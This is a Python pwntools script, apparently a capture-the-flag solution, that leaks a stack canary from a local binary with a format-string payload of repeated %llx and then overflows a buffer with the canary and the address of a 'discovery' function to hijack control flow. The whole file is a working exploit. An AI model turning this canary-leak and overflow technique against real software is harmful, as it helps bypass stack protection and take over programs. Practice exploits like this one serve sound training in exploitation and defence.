#Import pwntools and regular expressions
from pwn import *
import re

#Designate which elf we are using, and run it
target = process("./d0_64")
elf = ELF("./d0_64")
context(binary=elf)

#Send the format string exploit to leak the canary
target.sendline("%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llxesc%llxape")

#Store the output of the format string memory leak
memleak = target.recvline()

#Parse out the canary from the rest of the memory leak
canary = str(re.findall(r'esc(.*?)ape', memleak))

#Remove excess characters, print and convert the canary to a hex string
canary = canary.replace("['", "")
canary = canary.replace("']", "")
canary = "0x" + canary
print "The Canary Is: " + canary
canary = int(canary, 16)

#Designate the first and second filler segments
filler0 = "0"*24
filler1 = "0"*8

#Pull the symbol for the discovery function address
address = elf.symbols["discovery"]

#Construct the payload by combining the two filler segments, the canary and discovery address (in little endian)
payload = filler0 + p64(canary) + filler1 + p64(address)

#Send the payload (and print it)
print "Sending: " + str(payload)
target.sendline(payload)

#Print the program's output, which should include "Level Cleared!"
print target.recvline()


